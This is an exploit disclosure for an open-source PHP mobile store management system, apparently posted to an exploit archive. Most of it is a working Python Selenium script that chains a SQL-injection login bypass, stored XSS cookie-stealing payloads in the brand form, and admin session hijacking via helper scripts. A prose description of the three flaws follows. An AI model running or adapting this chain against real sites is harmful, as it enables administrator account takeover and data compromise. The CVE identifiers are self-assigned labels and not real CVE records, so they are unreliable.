### Exploit Title0: MSMS-PHP (by: oretnom23 ) v1.0 is remote SQL - Injection - Authentication vulnerable in /mobile_store/classes/Login.php.
### Exploit Title1: MSMS-PHP (by: oretnom23 ) v1.0 is XSS - Stored PHPSESSID Vulnerable app: brand parameters: "name" and "description"
### Exploit Title2: MSMS-PHP (by: oretnom23 ) v1.0 is remote PHPSESSID - Injection Vulnerable.
- - - HIT STRIKE!

### Author: nu11secur1ty
### Testing and Debugging: nu11secur1ty 
### Date: 09.02.2021
### Vendor: https://www.sourcecodester.com/user/257130/activity
### Link: https://www.sourcecodester.com/php/14924/online-mobile-store-management-system-using-php-free-source-code.html
### CVE: CVE-nu11-03

[+] Exploit Source: 

#!/usr/bin/python3
# Author: @nu11secur1ty
# Developement: @nu11secur1ty 
# Debug: nu11secur1ty & g3ck0dr1v3r
# CVE-nu11-05

from selenium import webdriver
import time
import os


#enter the link to the website you want to automate login.
website_link="http://localhost/mobile_store/admin/login.php"

#enter your login username
username="nu11secur1ty' or 1=1#"

#enter your login password
password="nu11secur1ty' or 1=1#"

#enter the element for username input field
element_for_username="username"
#enter the element for password input field
element_for_password="password"

browser = webdriver.Chrome()
browser.get((website_link))	

try:
	username_element = browser.find_element_by_name(element_for_username)
	username_element.send_keys(username)		
	password_element  = browser.find_element_by_name(element_for_password)
	password_element.send_keys(password)
	browser.maximize_window()
	time.sleep(1)
	browser.execute_script("document.querySelector('[class=\"btn btn-primary btn-block\"]').click()")
	
	time.sleep(1)
	exploit_link="http://localhost/mobile_store/admin/?page=maintenance/brand"
	browser.get((exploit_link))
	
	browser.execute_script("document.querySelector('[class=\"btn btn-flat btn-primary\"]').click()")
	time.sleep(3)
	browser.execute_script("document.querySelector('[name=\"name\"]').value=\"<script>alert(document.cookie)</script>\"")
	browser.execute_script("document.querySelector('[name=\"description\"]').value=\"<script>alert(document.cookie)</script>\"")
	time.sleep(1)
	browser.execute_script("document.querySelector('[id=\"submit\"]').click()")
	
	coockie=browser.execute_script("return document.cookie")
	coockie=coockie.split("=")[1]
	print(coockie)
	browser.close()
	
	os.system("python system.py")
	time.sleep(3)
	os.system("python PWNPHPSESSID.py " + coockie)
	
	print("The payload for CVE-nu11-05 is deployed...\n")
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")

[+] The other part of the software: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-05

------------------------------------------------------------------

### Remote vulnerable links execution:
http://localhost/mobile_store/admin/login.php
http://localhost/mobile_store/admin/?page=maintenance/brand

### Description:
The MSMS-PHP (by: oretnom23 ) v1.0 in the application /mobile_store/classes/Login.php is vulnerable in thre sections!
1. remote SQL-Injection-Bypass-Authentication
- m0re info: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. 
The parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. 
When the user will sending a malicious query or malicious payload to the MySQL server he can bypass the login credentials and take control of the administer account.
2. XSS - Stored PHPSESSID Vulnerable
- The vulnerable XSS app: is "brand", parameters: "name" and "description"
After the successful SQL injection, the malicious user can be storing an XSS payload whit who can take the 
active PHPSESSID session.
3. remote PHPSESSID - Injection
- After the successful XSS attack the malicious user can take control of the administrative account of the system from everywhere 
by using the PHPSESSID, and then he can make a lot of bad things!

-------------------------------------------------------------------
### CONCLUSION: This vendor must STOP creating all these broken projects and vulnerable software programs, probably he is not a developer!

### BR 
- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer

-------------------------------------------------------------------
### Reproduce: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-05
### Proof: https://streamable.com/c9dyxb
### BR nu11secur1ty
